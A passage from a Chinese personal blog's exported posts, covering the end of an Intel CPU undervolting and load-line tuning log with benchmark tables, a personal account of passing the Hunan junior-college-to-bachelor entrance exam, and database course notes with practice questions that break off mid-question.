DC。这里依然列一个表，既然是降压那就得把P95加进来。 依然是P95跑稳了再跑R23，打开超线程。 R23 基准分数 30800 这里贴一个我自己测试的 CPU Lite Load Control 表 LLC AC DC 1 1 1 2 10 80 3 15 80 4 20 80 5 25 80 6 30 80 7 35 80 8 40 80 9 50 80 10 60 80 11 70 80 12 80 80 13 90 90 14 100 100 15 110 110 … … … 调整 LLC 测试 VRM LLC CPU LiteLoad P95 R23 FPU remark Auto Auto(50 80) 掉线程109°C&#x2F;316W&#x2F;536W&#x2F;1.276V 97°C&#x2F;253W&#x2F;412W&#x2F;1.320V 100°C&#x2F;252W&#x2F;404W&#x2F;1.332V 内存调好基础上 Auto Auto(50 80) 109°C&#x2F;280W&#x2F;425W&#x2F;1.316V 94°C&#x2F;248W&#x2F;394W&#x2F;1.310V 98°C&#x2F;247W&#x2F;392W&#x2F;1.330V 全默认只改温度墙 Auto Auto(50 80) 降频109°C&#x2F;316W&#x2F;536W&#x2F;1.296V 94°C&#x2F;247W&#x2F;398W&#x2F;1.312V 96°C&#x2F;246W&#x2F;386W&#x2F;1.326V 以上基础开 BCLK 100Mhz Lock Auto Mode 1 闪退 报错 85°C&#x2F;210W&#x2F;318W&#x2F;1.194V Mode 8 Mode 1 蓝屏 报错 85°C&#x2F;210W&#x2F;318W&#x2F;1.194V Mode 7 Mode 1 闪退 87°C&#x2F;225W&#x2F;349W&#x2F;1.230V 90°C&#x2F;218W&#x2F;340W&#x2F;1.234V 30740 Mode 6 Mode 1 闪退99°C&#x2F;306W&#x2F;466W&#x2F;1.216V 91°C&#x2F;229W&#x2F;365W&#x2F;1.252V 91°C&#x2F;223W&#x2F;348W&#x2F;1.254V 30804 Mode 5 Mode 1 掉线程108°C&#x2F;305W&#x2F;494W&#x2F;1.248V 92°C&#x2F;237W&#x2F;382W&#x2F;1.272V 94°C&#x2F;228W&#x2F;368W&#x2F;1.274V 30684 Mode 4 Mode 1 不测了 °C&#x2F;W&#x2F;W&#x2F;V … … … … … 这里我感觉选 Mode 6 比较合适，先这样用几天看看。 换了新电源，重新测试一下。原来老电源3.3V和5V的DCDC有问题，导致内存不稳定，买了一个新的AR650+捍卫版，目前用着还挺不错的。 VRM LLC CPU LiteLoad P95 R23 FPU remark Auto Auto(50 80) 降频104°C&#x2F;290W&#x2F;551W&#x2F;1.254V 91°C&#x2F;243W&#x2F;418W&#x2F;1.310V 95°C&#x2F;245W&#x2F;409W&#x2F;1.324V Mode 6 Mode 1 闪退98°C&#x2F;295W&#x2F;491W&#x2F;1.218V 83°C&#x2F;220W&#x2F;364W&#x2F;1.236V 85°C&#x2F;214W&#x2F;355W&#x2F;1.238V Mode 6 Mode 1 92°C&#x2F;267W&#x2F;424W&#x2F;1.226V 73°C&#x2F;179W&#x2F;308W&#x2F;1.252V 82°C&#x2F;198W&#x2F;335W&#x2F;1.246V 以下关HT Mode 7 Mode 1 90°C&#x2F;255W&#x2F;413W&#x2F;1.202V 72°C&#x2F;174W&#x2F;300W&#x2F;1.236V 81°C&#x2F;192W&#x2F;331W&#x2F;1.226V 25266分 Auto(Mode 8) Mode 1 84°C&#x2F;188W&#x2F;316W&#x2F;1.194V 69°C&#x2F;168W&#x2F;284W&#x2F;1.202V 76°C&#x2F;186W&#x2F;300W&#x2F;1.192V 25272分 对于在这里我选择还是关闭 HT，如果保留 HT 的话可以锁一个253W的功耗墙，这样也可以。 动态超频首先根据泥潭大佬的步骤 第一步：摸出稳定的默频电压曲线也就是降压。像超频，一般会把设置调整到稳定性临界，在倍频电压曲线的默频部分，我也希望降压到稳定性临界。 限制电压对象为“实际VID电压”，建议设置为1450，即1.45v。防止哪个地方抽风或输入误操作给了超高电压把CPU炸了。 ACLL之前已设置为0.01，CPU没有ACLL掉压补偿，默认的VRM LL 1.10毫欧(LLC 等级3)掉压严重，大电流时会稳定性不足，所以之后还需要找一个合适的VRM LL&#x2F;LLC。DCLL也设置为0.01，这是为了方便观察“裸VID电压”，从而方便对VID曲线进行调整。副作用是“实际VID电压”未被DCLL降压，所以软件功耗会虚高。上面设置的253瓦功耗墙大概等价于正常设置的230瓦功耗墙。 调整 VRM LoadLine这里我设置的 VRM LLC Mode 6，也就是0.56mOhm。 这是我这块板子的 LLC 对照表 LLC1 0.01LLC2 忘了LLC3 0.12LLC4 0.28LLC5 0.4LLC6 0.56LLC7 0.69LLC8 0.96 对于 LLC 电压补偿和 CPU LiteLoad 还有 AVX2 Voltage Guardband 我有点不太清楚，所以这里做一个测试看看。 在 VRM LoadLine Mode 6 下调整 CPU LiteLoad Mode。 LiteLoad Vcore 温度 软显功耗 整机功耗 mode1 1.222 96 299 443 mode1+关avx升压 1.222 93 299 435 mode2 1.248 100 273 466 mode2+关avx升压 1.248 100 272 453 mode3 1.264 103 282 470 mode3+关avx升压 1.264 101 281 475 AC DC 1+关avx升压 1.222 97 295 448 实测 AVX2 Voltage Guardband 大概是没用的，就算有用也作用很小。 VRM LoadLine P95 CPU-Z R23 FPU Auto 闪退 865&#x2F;12667&#x2F;1.22V 30895&#x2F;215&#x2F;308&#x2F;1.194V 75°C&#x2F;208W&#x2F;299W&#x2F;1.198V Mode 6 94&#x2F;298&#x2F;434&#x2F;1.222V 863&#x2F;12664&#x2F;1.272V 30783&#x2F;228W&#x2F;341W&#x2F;1.252V 84°C&#x2F;222W&#x2F;331W&#x2F;1.256V Mode 7 闪退 81°C&#x2F;222W&#x2F;331W&#x2F;1.236V Mode 8 闪退 866&#x2F;12686&#x2F;1.222V 30800&#x2F;212W&#x2F;310W&#x2F;1.192V 77°C&#x2F;207W&#x2F;303W&#x2F;1.198V 可以得出结论是 CPU Lite Load Mode 调整的是 AC DC LoadLine 的值，而 LLC Mode 则调整的是 VRM LoadLine 的值，而 AVX2 Voltage Guardband 好像没什么作用，其三者功能都是对 CPU 做电压补偿，所以楼主所说的仅用 LLC 做电压补偿是可行的。 调整 Voltage Offset在此基础上我对 CPU 电压进行 Offset 调整，目前我 CPU 的参数是：AC DC 1, LLC Mode 6, AVX Voltage Guardband Scale 0, PL1&#x3D;PL2&#x3D;253W。 然后根据楼主的方法跑R23测试临界值，不跑 P95 AVX 的原因是因为负载太大，其实际使用中根本碰不到这种场合，所以意义不大 VRM LLC Offset P95 R23 FPU result 6 -0.05 闪退 85°C&#x2F;226W&#x2F;351W&#x2F;1.252V 6 -0.10 79°C&#x2F;206W&#x2F;323W&#x2F;1.208V 80&#x2F;201W&#x2F;316W&#x2F;1.212V 6 -0.11 78°C&#x2F;203W&#x2F;316W&#x2F;1.198V 79&#x2F;197W&#x2F;306W&#x2F;1.202V 6 -0.12 掉线程76°C&#x2F;220W&#x2F;311W&#x2F;1.190V Auto -0.05 76°C&#x2F;212W&#x2F;314W&#x2F;1.196V Auto -0.06 掉线程75°C&#x2F;210W&#x2F;310W&#x2F;1.186V Auto -0.07 掉线程 Auto -0.10 掉线程 摸 CPU 跑 R23 的最低电压 Freq Offset R23 remark 5.3GHz -0.19V 1.152V 5.4GHz -0.185V 1.192V 5.5GHz -0.14V 1.236V 5.6GHz -0.09V 1.286V&#x2F;188W 5.7GHz +0.01V 1.366V&#x2F;229W 5.8GHz +0.12V 1.494V&#x2F;299W 设置少了不稳，设置多了撞墙 摸单核体质摸 VID 表在摸大核体质的时候因为小核最低也有 1.0xV 的电压，所以需要手动进BIOS把小核关闭。 得到VID表如下 第二步：放弃其实在降压过程中在调整LLC后，对于我这颗CPU的体质已经到上限了，再调整频率的话收益不大，所以就这样用了，在极限烤机下能到温度墙的边缘，自己已经挺满意这样的情况了。 所以CPU下最终结果是，关闭 HT+VRM LLC Mode 8 7 + CPU LiteLoad Mode 1。 对性能0提升，仅仅对极限环境下的稳定性有提升（伪）。 参考资料https://ngabbs.com/read.php?tid=34192551&amp;rand=980 https://skatterbencher.com/2022/11/24/skatterbencher-50-intel-core-i7-13700k-overclocked-to-6000mhz/ https://elmorlabs.com/2019-09-05/vrm-load-line-visualized/","categories":[{"name":"硬件","slug":"硬件","permalink":"https://blog.irec.moe/categories/%E7%A1%AC%E4%BB%B6/"}],"tags":[{"name":"PC","slug":"PC","permalink":"https://blog.irec.moe/tags/PC/"}]},{"title":"3年大专&专升本上岸记录","slug":"学习/经验/湖南理工学院专升本上岸记录","date":"2022-07-30T12:30:00.000Z","updated":"2023-08-19T04:16:49.000Z","comments":true,"path":"/escape_ydxy.html","permalink":"https://blog.irec.moe/escape_ydxy.html","excerpt":"","text":"个人背景我高三厌学，因为家里有表哥的先例，和家人商议后选择了单招。前期院校就随便凭自己的兴趣选的湖南邮电职业技术学院。 在19年那年单招考试成绩出了后，我被原高中准许离校，便赴约去了深圳一趟（4月），见到了好多好多大佬。 一窗台手机的大佬 单招考试的时候报名了校内的青春10000号，之后回校（湖南邮电职业学院）参加，就相当于打暑假工了。工作虽然不辛苦，但是很锻炼情绪，自己的坏习惯暴脾气给上班上没了，具体原因嘛，你猜。 上班到9月我就提桶跑步了，暑假工的钱，给父上大人换了一个K20Pro。 之后就是大学生活的日常了，军训，开学第一课…… 一切都很正常，是我想要的大学样子，自己也对现状很满意（伪）。 其实直到大三我才意识到这完全不是我想象中大学的样子，在大一上课我要么就是在玩斗地主要么就是在睡觉，室友开始逃课，我也开始逃课，不过晚上还是要上班。生活是真的充实，每天睡的很香。 要不被环境影响是很难的，自己也很难意识到，大专总体环境就不说了吧，就是网上说的大专现状那样子。但虽然是大专但也有好的老师，给予我很多启发以及帮助，比如王香英老师，熊雅豪老师、张倩老师…… 突如起来的疫情，让很多人都乱了手脚，我却很开心，到家不愁吃不愁穿，每天还能打游戏。开学的也是一个“假”开学。上课同学基本上不听，然后我也接着不听了，后来呢老师也摆烂。 疫情期间让我印象最深的是王老师不拘泥于网课形式，仍然对同学尽心尽力，连我也“被迫”参与其中，因为考核形式实在是不能摆，23333。 因为王老师的教学形式，我对英语的兴趣始终没有减退，从大二开始就一直记单词到现在，英语三、四级考试也成功顺利通过了，准备在本科冲一冲六级。 大二是我觉醒的时期，因为在大一下的疫情期间，被人作为大专生瞧不起。这也是一个契机，凭啥就凭学历歧视人，我也没隐瞒我是大专生，就因为学历这样说别人，带专人人上人？我看未必。 大三上的后半个学期和暑假实习去了，这着实让我感觉到了生活的艰辛，并以此为契机开始努力学习了。后面就是专升本的事情了。 这种充实的生活引起我的警觉了，因为白天几乎没有闲着，晚上洗澡的时候思考人生。究竟适不适合干这种事（智能家居安装），觉得工作价值意义不太符合自己的观念。但是自己一直在以“提前体验生活、体验社会”为理由，让自己坚持。自己本身目的之一是拿到实习证明，第二是去得到社会经验。 from：https://ancient-pasta-c48.notion.site/2021-f233c5e6f5c3415595ef90778fb67f3a 考试前期准备在校首先是知道了有个自考专升本，也报名了，再后面才知道有统招的专升本，有点后悔，三年的钱也有1w了，但是也算自己成功路上的铺垫吧。 专业选择在湖南省的话，这一块只要关注一个文档。 《湖南省2022年普通高校专升本考试对应专业（类）指导目录》 from：https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksyzcfg/202204/t20220418_22739135.html 湖南的政策是不允许跨考，也就是只能报考你专业相关的，这点同学们需要注意。 比如我的是移动通信技术专业，所属专科专业大类是通信，然后可以报考本科的电子信息类和计算机类。 有一个培训机构专门做了一个网站，可以在上面查询可以报的专业和学校，就不用自己一个一个翻查了。 link：http://www.cnupp.com/chaxun/ 2022年专升本考试有所延期，在3月9日的时候发了推迟通知。我得以多了半个月学习时间，这至关重要！ 1.填报志愿时间由3月10日-15日延迟到3月22日-27日； 2.免试生录取完成时间由4月15日延迟至4月25日； 3.考试时间由4月20日-30日延迟到5月6日-16日； 4.录取时间由5月15日左右延迟到6月10日左右。 from：https://jyt.hunan.gov.cn/jyt/sjyt/hnsjyksy/web/ksygggs/202203/t20220309_22739656.html 反正需要时时刻刻关注招考动态，在学校官网和湖南省教育厅都会有通知的 择校其实也没有什么好选的，建议根据自己的学习情况，针对性的择校。如果自己觉得能力强的话，可以冲一冲，如果不太好还是保守点好。 对于现在这个大环境下，有一个本科学历还是要比专科好的（先不论个人能力），自己一定要慎重选择，只有一次机会。 我个人只是嫌弃民办学校学费太贵，不想给家里太大压力。大家一定要量力而行！参考上面的图我报的学校以及专业录取率只有13.33%。 from：https://www.bilibili.com/video/BV1VP4y1W7WE 关于考试以及备考在考试的前期学校官网会有考纲出来，关注学校官网以及教务处这两个地方！然后就可以看到你所要考的科目，以及考试范围（这个依学校来定） 由于是已经考完了才写的，所以在后文是以考试角度分析的，也对你们更有参考性一点。对于以此学校为目标备考的同学更有参考性一点。不过我个人建议还是要熟络全书，选拔性考试，还是要做好万全的准备的。 时间线2021年7月-10月7月13日，和家里人商量专升本事宜，表示支持。 7月15日报名缴费楚晟教育培训班，学费6***。 7-10月实习，学习时间极少 这是唯一在相册里找到的图片。 2021年10月-12月参加学校毕业设计培训。 参加自考专升本考试。 开始跟班学习，刚开始备考是准备通信工程专业的，对我来说通信原理和高数是两大天坑，然后查资料才知道是可以选其他专业的，培训班的老师还持怀疑态度，劝退我。 11月，开始备考四级和自考英语考试，脱离宿舍生活。 图书馆周末不开门 一个人在操场上散步 2021年1月-2月 回家过年 没有学习 断断续续的学习回学校开始上线下的课程了，已经意识到了紧迫性，因为在此之前，自己的学习时间仅仅只限于上课的时候，线下完全没有自己去主动学习。 这是Notion，用的b站Hannability的模板。 可以看出来我在2月前是比较难受的一个阶段，我自己可以把这段时间定义为自己的试错阶段吧，自己在不断尝试新方法来提高自己的学习力，再后面的几周就变样了，关于里面的内容我可以截取一周的给你们参考。 这是一个简单的 Tracker。 每天花5分钟写一写东西，保持输出能力。 然后后面几周的可见比以前的好很多了。 心理过程要说我不焦虑是不可能的，其实是后面的焦虑感越来越大，被我化成动力了。 晚上想高数的题目睡不着觉，凌晨5点爬起来刷模拟卷，其实到最后高数的模拟卷只做了5套，完整复盘了3套。 我最大的问题确实是在高数，我前期刚开始复习的时候连三角函数都分不清。后面还是慢慢来，题目一道一道做，看书上的知识点记忆+实践。平时上课的知识点全部弄懂了，然后错题也整理，老师上课讲的每一道题目都弄懂弄通，不会的题目就丢错题本里，一遍一遍刷，第一遍做对的题目就留着，做错的打个标记擦掉，第二天继续做，重复以上，直到做对为止。 程序设计基础，emmm，就只有数据库没学过，C是浅学吧，也不难。这俩我花的时间相对较少。 考试前夕5月3日，定了一个学校附近的宾馆的情侣房，其他宾馆要么就是比较差的，要么没房了，只剩下这个了。。这也是我人生中唯一一次住情趣房。233333，如果再晚点就没地方住了就惨了。其实应该还早点定的，岳阳的宾馆挺便宜，这种房2晚只要226。 然后查了查进学校考试是走东一门，刚开始还感觉怪怪的，怎么是南湖学院，是不是搞错了，事实证明就是这里。（直到今天我还是没搞懂这个学校的院区分部，南湖是在北方，本部却在南方，好奇怪设定） 5月10日，根据发的涉疫统计表，查看了竞争压力，也就是简单筛选一下那些因为疫情不能来的，给自己减轻一些压力。 5月13日 G832 长沙 -&gt; 岳阳。 学校大门口 所谓的情趣大床，23333 买了桶装水，咖啡是自备的，怕考试的时候睡着。 第二天一清早就看到父上大人发的消息，趁着泡咖啡的功夫洗了个澡。 早餐吃的玉米肠+牛奶，要让自己有点饥饿感，才不犯困。 上午考完，自我感觉不错，中午的饭是免费的。 下午考完就去找了饼饼，约了个饭（实际上是各付各的），第二天早上我就回我的大专了。 学校的图书馆 考试阶段大学英语英语是四级难度差不多的水平，我也只考了73分。对于我仍然是完形填空和作文拉了，拿手的阅读理解试卷上只有两篇。 如何更能优化呢？这个不用多说吧。 理工专业基础这一门考试其实是数学，只考了高数上，当时看到考纲的时候只说了考同济高数这本书，我打电话给学校的老师问，也表示不清楚，要等老师。复习的时候我高数上下双修，最后没考是没想到的。 刚开始跟同学讨论，预测高数上是重点。 题目难度并不难，其中很多题目我都做过了。考察的重点是积分部分，比如说三角换元、裂项相消之类的。这种小技巧的并不太难的地方我都针对性的复习了，所以考试在这方面没有太丢分。最后一题是定积分求面积，没做出来（但那道题求体积我会做），题目我贴在下面了，有兴趣可以做一下。 最后考试考了87分，其实我考试的时候求不定积分常数 C 忘记写了，不过老师是人性化改卷，该扣的扣了该给的也给了。 总体难度还是偏易，毕竟这是面向专科生的考试。 程序设计基础最后一门是程序设计基础，这场考试刚拿到试卷我就窃喜了，因为：全！是！编！程！题！ 在学校发布的文件中，我很早就注意到了这句话 以程序设计工程应用能力考核为主 这代表了什么，代表了肯定是编程题占大头。没想到占这么大头，试卷一共5道题，每道题20分。前4道是C语言的，最后一道是数据库的。 题目都不难，数据库我认为比较难的 not exist 都没考，难度就到多表查询那么大。 C 语言的题目的难度呢，我认为在 OJ 里刷3天题目就够了，然后把谭书简单看一遍。 举一道题的例子吧，是这样的。 输入一个正整数，求这个数的偶数和（包括它本身） 例： 输入：5 输出：6 输入：8 输出：20 这是我认为在里面比较难的题目了，因为其他题目都是简单的输入输出循环控制。这道题稍微要动一点点脑子。 总结考试难度中等偏易，给的建议就是要全面复习，不要往难题钻，这也是我们数学老师多次强调的. 在前期复习的时候我看的是 MOOC 上翁恺的课程，数据库看的是哈工大课程，现在网上资源特别丰富，根本不愁找不到课程，最重要的还是自己的决心与毅力。 考试结束后5月19日，我还在整理大专的旧书，准备拖出去卖。别人告诉我的学校官网公布成绩了。 当时自己还觉得自己上不了，然后查下来发现排名是本专业第二，和之前查参加考试人数一样的办法。 第一名是他，第二名就是我了。 晚上就和室友拿卖书的钱买奶茶喝了。 之后呢，就是忙毕设，整理行李回家。 6月28日，顺利拿到专科毕业证。 8月3日，拿到专升本录取通知书。 后记这篇主要是以记录为主，本人文笔有限只能像写日记这样叙述出来。 学历是一块敲门砖，但是不要忘了能力依然很重要。 我虽然作为专科生，但是在自己的空闲时间折腾很多奇奇怪怪的东西，和周围的同学相比格格不入（虽然我也玩游戏）。但是我记着我要对自己的人生负责，自己想要什么样的生活就去争取。我从高中到大学的最大变化是，有了长远目标了。 曾经的我是只要有游戏玩，能让我快乐就满意了，但是经过了很多次现实的历练（实习）逐渐认识到了残酷，赚钱真难，官场气氛难受。然后发现学习是另一条能让自己成长的路，既然还年轻，不如多学一点？ 我个人的建议是，建议你们提前体验一下实习的生活，专科的实习是一个很棒的机会，如果没有实习，我心里就没有强烈的对比感，可能这个本科也就上不去了。 痛苦+反思&#x3D;进步 我一直在用这个来减轻痛苦，事实证明这也有用。 希望本文能帮助到你们，也希望你们能顺利升上自己想要的大学。 加油！","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"考试","slug":"考试","permalink":"https://blog.irec.moe/tags/%E8%80%83%E8%AF%95/"},{"name":"升学","slug":"升学","permalink":"https://blog.irec.moe/tags/%E5%8D%87%E5%AD%A6/"}]},{"title":"数据库笔记","slug":"学习/记录/数据库笔记","date":"2022-04-15T16:00:00.000Z","updated":"2025-07-07T17:24:56.000Z","comments":true,"path":"/dbnote.html","permalink":"https://blog.irec.moe/dbnote.html","excerpt":"","text":"数据库笔记第1章 绪论1.1 数据库系统概论1.2 数据模型数据模型是对现实世界数据特征的抽象 数据模型是数据库系统的核心和基础 两类数据模型概念模型（信息模型）：按用户的观点来对数据和信息建模，用于数据库设计 逻辑模型（网状模型、层次模型、关系模型、面向对象数据模型….）：按计算机系统的观点对数据建模、数据库管理系统的实现 物理模型： 描述数据在系统内（磁盘上）的表示方法和存取方法 现实世界 –&gt; 概念模型：数据库设计人员完成 概念模型 –&gt; 逻辑模型：数据库设计人员完成、数据库设计工具协助完成 概念模型实体-联系（Entity-Relationship）：用E-R图来描述现实世界的概念模型 实体：具体的人、事或抽象的概念（例如学生 属性：就是属性 码：唯一标识 实体型：实体名+属性名来抽象刻画同类实体 实体集：同一类型实体的集合 联系：就是联系 实体内部的联系：各属性之间的关系 实体之间的联系：不同实体集之间的联系（1 : 1、1 : M、M : N） 数据模型：是严格定义的一组概念的集合**数据结构：**组成对象和对象之间的联系 **数据操作：**对数据库允许执行的操作的集合。就是对操作的规则 **数据的完整性约束：**要让数据库符合这种规则不让数据库乱七八糟（主键必须存在，如果有引用的外键，要怎么怎么样做之类 关系数据模型是目前最重要的一种数据模型，它的三个要素分别是（ ） A. 实体完整性、参照完整性、用户自定义完整性 B. 数据结构、关系操作、完整性约束 C. 数据增加、数据修改、数据查询 D. 外模式、模式、内模式 这题和哪种数据模型没关系，数据模型通常都由那三种组成的。 常用的数据模型 格式化模型中的数据结构的单位：基本层次联系 层次模型表示方法：实体型、属性、联系 定义：1、只有一个节点没有双亲节点，这个节点叫根节点 ​ 2、根以外的其他节点只有一个双亲节点 特点：1、节点双亲唯一 ​ 2、只能直接处理一对多 ​ 3、不能脱离双亲独立存在 ​ 4、任何记录只能一层一层找下去 优点：1、数据结构清晰 ​ 2、查询效率高，性能优于关系模型 ​ 3、良好的完整性支持 缺点：1、多对多联系不太好 ​ 2、插入和删除限制多 ​ 3、查询子女节点必须经过双亲节点 网状模型表示方法同层次模型 定义：1、允许一个以上的节点无双亲 ​ 2、一个节点可以有多个双亲 ​ 3、两个节点有多种联系 多对多在网状模型中的表示：多对多分解成一对多 完整性约束条件不严格： 1、允许插入未确定双亲结点值的子女节点值 2、允许只删除双亲节点值 实际的网状数据库系统： 1、支持码 2、保证一个联系中双亲记录和子女记录之间是一对多联系 3、可以定义双亲记录和子女记录之间某些约束条件 例：要求双亲记录存在才能插入子女记录，双亲记录删除时也同时删除。 ​ 学生选课记录值中学号必须是学生记录中存在的某一学生学号， ​ 课程号必须是课程记录中存在的某一门课程号。 优点：1、更加直接的描述现实世界，一个节点多个双亲 ​ 2、性能高 缺点：1、结构复杂 ​ 2、DDL、DML 语言太难 关系模型关系（Relation）：一张表 元组（Tuple）：一行即为一个元组 属性（Attribute）：一列即为一个属性 主码（Key）：唯一确定一个元组 域（Domain）：一组具有相同数据类型的值的集合，属性的取值范围来自域** 分量：元组中的一个属性值 关系模式：对关系的描述 ​ 学生（学号，姓名，年级，年龄） 关系必须是规范化的，关系的每一个分量必须是一个不可再分的数据项（这个好理解周老师讲过了，列中有列） 数据操作都是集合操作：操作对象和操作结果都是关系 优点：1、建立在严格的数学概念的基础上 ​ 2、概念单一：实体和各类联系都用关系来表示，对数据的检索结果也是关系 ​ 3、关系模型的存储路径对用户透明 缺点：由于存储路径透明，查询效率不如格式化数据模型。为了提高效率必须对用户的查询请求进行优化（例如缩小查询范围，多表关联的时候先筛一部分） 1.3 数据库系统的结构开发人员角度：三级模式结构。数据库系统内部的系统结构 用户角度：单用户结构、主从式结构、分布式结构、客户-服务器、浏览器-应用服务器 &#x2F; 数据库服务器 模式的概念模式：对数据库逻辑结构和特征的描述（学生表） 实例：模式的具体值（升本成功的所有学生的记录、没有升本成功的所有学生的记录） 模式是固定的、示例是变化的 三级模式 多个 外模式（子模式、用户模式）：数据库用户使用的局部数据的逻辑结构和特征的描述 ​ 与模式的关系：通常是模式的子集、一个模式有多个外模式 ​ 与应用的关系：一个外模式可以为多个应用系统所使用，一个应用程序只能使用一个外模式 ​ 用途：简化用户视图。保证数据库安全性 一个 模式（逻辑模式）：数据库中全体数据的逻辑结构和特征的描述 ​ 定义：1、用 DDL 定义数据的逻辑结构 ​ 2、定义数据之间的联系 ​ 3、定义数据有关的安全性、完整性要求 一个 内模式（存储模式）：物理结构和存储方式的描述 二级映像外模式 -&gt; 模式 定义外模式和模式之间的对应关系 映像定义 通常包含在各外模式的描述中 每一个外模式都有一个 外模式 -&gt; 模式 映像 保证数据的逻辑独立性：当模式改变时，DBA 对 外模式 &#x2F; 模式 映像做相应改变，使外模式保持不变。应用程序是依据数据的外模式编写的，应用程序不用改，保证了数据与程序的逻辑独立性，简称RT 模式 -&gt; 内模式 定义数据全局逻辑结构与存储结构之间的对应关系 这个映像是唯一的，保证数据的物理独立性 优势：保证了应用程序的稳定性 ​ 以程序为中心 -&gt; 以数据为中心 ​ 数据的存取由数据库管理系统管理 1.4 数据库系统的组成1、硬件平台及数据库：大内存、大磁盘、大通道 2、软件：数据库管理系统、操作系统、与数据库接口的高级语言及其编译系统、应用开发工具、数据库应用系统 3、人员：用户、应用程序员、系统分析员和数据库设计人员、数据库管理员 1、数据库管理员：略 2、系统分析员：负责应用系统的需求分析和规范说明 ​ 与用户及数据库管理员结合，确定系统的硬软件配置 ​ 参与数据库系统的概要设计 ​ 数据库设计人员：参加用户需求调查和系统分析确定数据库中的数据 ​ 设计数据库各级模式 3、应用程序员：设计和编写应用系统的程序模块进行调试和安装 4、用户：通过应用系统的用户接口使用数据库 1.5 小结重点：概念模型的基本概念、数据模型的3个组成要素、三模两映、数据库系统的逻辑独立性和物理独立性 第10章 数据库恢复技术事务的四大特性：ACID Atom 原子性 Consistent 一致性 Isolate 隔离性 Duration 持久性 第11章 并发控制并发带来的问题丢失修改 读脏数据 不可重复读 解决办法排他锁：写锁 X锁 共享锁：读锁 S锁 封锁协议一级封锁协议：修改时，必须加X锁，直到结束。 二级封锁协议：读的时候，加S锁，用完就放。 三级封锁协议：读的时候，加S锁，直到结束。","categories":[{"name":"学习","slug":"学习","permalink":"https://blog.irec.moe/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://blog.irec.moe/tags/%E7%AC%94%E8%AE%B0/"},{"name":"数据库","slug":"数据库","permalink":"https://blog.irec.moe/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/"}]},{"title":"数据库错题","slug":"学习/记录/数据库错题","date":"2022-04-15T16:00:00.000Z","updated":"2025-07-07T17:25:02.000Z","comments":true,"path":"/dbquestion.html","permalink":"https://blog.irec.moe/dbquestion.html","excerpt":"","text":"数据库错题下面列出的数据管理技术发展的三个阶段中，没有专门的软件对数据进行管理的是（ ）。 I．人工管理阶段 II．文件系统阶段 III．数据库阶段 A. I 和 II B. 只有 II C. II 和 III D. 只有 I 关于数据库系统语言，下列说法正确的是______。 A.数据库系统语言包括了DDL和DML B.数据库系统语言包括了DDL、DML和DCL C.数据库系统语言包括了DDL、DML和C++&#x2F;Java D.数据库系统语言包括了DDL、DML和程序设计语言 下列说法不正确的是_______________。 A.模式是对数据的抽象，数据的结构性描述称为模式 B.数据模型是对模式的抽象，模式的结构性描述称为数据模型 C.一个数据库是由一系列模式及其数据构成的 D.模式是对数据模型的抽象，数据模型的结构性描述称为模式 第一代数据库系统是指_______________。 A.文件系统 B.基于XML模型的数据库系统 C.基于关系模型的数据库系统 D.基于网状模型或层次模型的数据库系统 tip:是数据库系统，不是数据管理（记录）阶段 第二代数据库系统是指_______________。 A.基于文件的数据库系统； B.基于XML模型的数据库系统 C.基于网状模型或层次模型的数据库系统 D.基于关系模型的数据库系统 现有如下关系：患者（患者编号，患者姓名，性别，出生日期），医疗（患者编号，患者姓名，医生编号，医生姓名，诊断日期）。其中，“医疗”关系中的外键是_______ A.患者编号 B.患者姓名 C.患者编号和患者姓名 D.医生编号 关于关系模型完整性的说法，不正确的是___ A.外键如果取空值，则违反了参照完整性 B.数据库中有了空值会影响许多方面，如影响聚集函数运算的正确性等 C.用户自定义完整性是指用户针对具体的数据库应用所定义的完整性约束条件 D.实体完整性和参照完整性一般由DBMS系统自动支持 tips：外键可以为空，非空则要有对应的值 关于关系模式与关系，说法不正确的是_______ A.关系模式是稳定的；同一关系模式下，只有一种关系 B.同一关系模式下，可有很多的关系 C.关系模式是关系的结构, 关系是关系模式在某一时刻的数据 D.关系模式是稳定的；而关系是某一时刻的值，是随时间可能变化的 根据上述关系，求表R⋈W的结果_______ A. B. C. D.没有正确答案 系如下图所示，查询既学习课程号为001课程又学习课程号为002号课程的学生的学号,正确的是_______ A. B. C. D. tip：D选项查询结果为空，原因自己想。 关系R与关系S只有一个公共属性，T1是R与S做θ连接的结果，T2是R与S自然连接的结果，则下列说法正确的是_______ A.T1的属性个数大于T2的属性个数 B.T1 的属性个数等于T2 C.T1的属性个数小于T2 D.T1的属性个数大于或等于T2的属性个数 tip：做θ连接时不需要将公共属性合并，而自然连接时需要，所以 T1 的属性个数大于 T2 的属性个数 已知关系S(S#,Sname,Sage,Sclass), SC(S#,C#,Score)。如下所示关系代数表达式的含义是________。 A.其他全不对 B.查询没有学习过课程号为002号课程的学生姓名和年龄 C.查询不仅仅学习课程号为002号课程的学生姓名和年龄 D.查询学习课程号为002号课程的学生姓名和年龄 tips：此公式中 S X SC 运算之后 , 所有人都存在 C#&#x3D; 002 所以答案为空。 表达“从一个关系的所有行中提取出满足某些条件的行”，“从一个关系的所有列中提取出某些列”“提取出属于一个关系但不属于另一关系的所有元组”“将两个关系必须按照某种条件串接成一个较大的关系”的操作依次是__________。*1、并 2、交 3、积 4、选择 5、投影 6、差 7、连接* A.4567 B.4537 C.3567 D.4561 tip：理解概念，认真读题。错选的原因是没有读到 必须按照某种条件串接 并只是简单的并起来就行了。连接有很多中条件可以选。 设关系R与关系S具有相同的目数（或称度数），且相对应属性的值取自同一个域，则R-(R-S）等于_________。 A.R∩S B.R∪S C.S - R D.S tip：为 R 与 S 的交，由同时出现在 R 和 S 中的元组构成，交运算可以通过差运算来实现： R S&#x3D;R –(R S)&#x3D;S –(S R) INSERT INTO Goods(Name，Storage，Price) VALUES (’Keyboard’，3000，90.00)的作用是________。 A.添加数据到一行中的部分列 B.添加数据到一行中的所有列 C.插入默认值 D.插入多个行 tip:添加的可能是所有列，也可能是部分列。这题有歧义，没有给表结构 设关系Teacher的结构为：Teacher（T# char(3), Tname char(10), D# char(2), Salary float(2))，其中T#教师编号，Tname教师姓名，D#系号，Salary工资。Dept（D# char(2),Dname char(10),Dean char(10)),Dname系名，Dean系主任。若要将所有计算机系的教师工资上调10%，则可用_________。 A.Update Teacher Set Salary &#x3D; Salary * 1.1 Where D# in ( Select D# From Dept Where 